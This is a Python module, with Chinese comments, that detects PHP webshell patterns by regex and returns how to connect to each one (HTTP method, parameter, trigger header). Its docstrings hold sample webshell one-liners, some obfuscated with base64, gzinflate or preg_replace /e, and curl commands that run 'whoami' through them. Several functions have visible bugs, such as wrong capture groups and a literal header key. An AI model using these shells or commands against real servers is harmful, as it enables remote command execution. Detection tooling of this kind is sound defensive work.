import re
from typing import Optional
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.webshell_organizer import ConnectionInfo

def detect_get_key_and_post_func(content: str) -> Optional[ConnectionInfo]:
    """
    php demo:
    $lang = (string)key($_GET);  // key返回数组的键名
    $lang($_POST['cmd']); 
    ?>

    curl demo:
    curl -X POST "http://{base_url}?system=1" -d "cmd=whoami"
    """
    if "key($_GET)" in content:
        param_match = re.search(r"\$_POST\[['\"](\w+)['\"]\]", content)
        param = param_match.group(1) if param_match else "cmd"
        return ConnectionInfo(
            method="POST",
            param_name=param,
            url_param="system=1",
        )
    return None

def detect_eval_with_post(content: str) -> Optional[ConnectionInfo]:
    if "eval(" in content and "$_POST" in content:
        param_match = re.search(r"eval\(\s*\$_POST\[['\"](\w+)['\"]\]\s*\)", content)
        if param_match:
            return ConnectionInfo(
                method="POST",
                param=param_match.group(1)
            )
    return None

### 函数 1：识别 assert($_GET['a']) 或 eval($_POST['x'])

def detect_simple_eval_assert(content: str) -> Optional[ConnectionInfo]:
    """
    识别 eval/assert 执行来自请求参数的代码

    code = "eval($_POST['cmd']);"
    """
    pattern = r"(eval|assert)\s*\(\s*\$_(GET|POST|REQUEST)\[.*?\]\s*\)"
    match = re.search(pattern, content)
    if match:
        return ConnectionInfo(
            method=match.group(2),
            param=match.group(1)
        )
    return None


### 函数 2：base64 + eval

def detect_base64_eval(content: str) -> Optional[ConnectionInfo]:
    """
    php demo:
    eval(base64_decode($_POST['cmd']));
    ?>

    curl demo:
    curl -X POST "http://{base_url}?system=1" -d "cmd=whoami"
    """
    pattern = r"eval\s*\(\s*base64_decode\s*\(\s*\$_(GET|POST|REQUEST)\[.*?\]\s*\)"
    match = re.search(pattern, content)
    if match:
        return ConnectionInfo(
            method=match.group(1),
            param=match.group(1)
        )
    return None


### 函数 3：gzinflate + base64 + eval

def detect_gzinflate_chain(content: str) -> Optional[ConnectionInfo]:
    """
    php demo:
    eval(gzinflate(base64_decode($_POST['cmd'])));
    ?>

    curl demo:
    curl -X POST "http://{base_url}?system=1" -d "cmd=whoami"
    """
    pattern = r"eval\s*\(\s*gzinflate\s*\(\s*base64_decode\s*\(\s*\$_(GET|POST|REQUEST)\[.*?\]"
    match = re.search(pattern, content)
    if match:
        return ConnectionInfo(
            method=match.group(1),
            param=match.group(1)
        )
    return None


### 函数 4：preg_replace /e

def detect_preg_replace_eval(content: str) -> Optional[ConnectionInfo]:
    """
    php demo:
    preg_replace('/.*/e', $_POST['cmd'], 'xxx');
    ?>

    curl demo:
    curl -X POST "http://{base_url}?system=1" -d "cmd=whoami"
    """
    pattern = r"preg_replace\s*\(\s*['\"]/.*/e['\"]\s*,\s*\$_(POST|GET|REQUEST)\[.*?\]"
    match = re.search(pattern, content)
    if match:
        return ConnectionInfo(
            method=match.group(1),
            param=match.group(1)
        )
    return None


### 函数 5：php://input

def detect_php_input_eval(content: str) -> Optional[ConnectionInfo]:
    pattern = r"(eval|assert)\s*\(\s*file_get_contents\s*\(\s*['\"]php://input['\"]\s*\)\s*\)"
    match = re.search(pattern, content)
    if match:
        return ConnectionInfo(
            method="POST",
            param="php://input"
        )
    return None


### 函数 6：变量函数调用

def detect_variable_function_call(content: str) -> Optional[ConnectionInfo]:
    """
    php demo:
    $f=$_GET['a']; $f($_POST['cmd']);
    ?>

    curl demo:
    curl -X POST "http://{base_url}?a=eval" -d "cmd=whoami"
    """
    pattern = r"\$\w+\s*=\s*\$_(GET|POST|REQUEST)\[.*?\];.*?\$\w+\s*\(\s*\$_(GET|POST|REQUEST)\[.*?\]\)"
    match = re.search(pattern, content, re.DOTALL)
    if match:
        return ConnectionInfo(
            method="POST",
            param="cmd",
            url_param="a=eval"
        )
    return None


### 函数 7：$_SERVER Header 触发

def detect_server_variable_trigger(content: str) -> Optional[ConnectionInfo]:
    """
    php demo:
    $_SERVER["HTTP_USER_AGENT"]=="Googlebot" and eval($_POST["cmd"]);
    ?>

    curl demo:
    curl -X POST "http://{base_url}?system=1" -d "cmd=whoami"
    """
    pattern = r"\$_SERVER\[['\"]HTTP_(USER_AGENT|REFERER)['\"]\]\s*==.+?eval\s*\(.*?\)"
    match = re.search(pattern, content)
    if match:
        return ConnectionInfo(
            method="POST",
            param="cmd",
            header={
                f"match.group(1)": "Googlebot"
            }
        )
    return None


if __name__ == "__main__":
    content = """
    $lang = (string)key($_GET);  // key返回数组的键名
    $lang($_POST['cmd']); 
    ?>
    """
    print(detect_get_key_and_post_func(content))
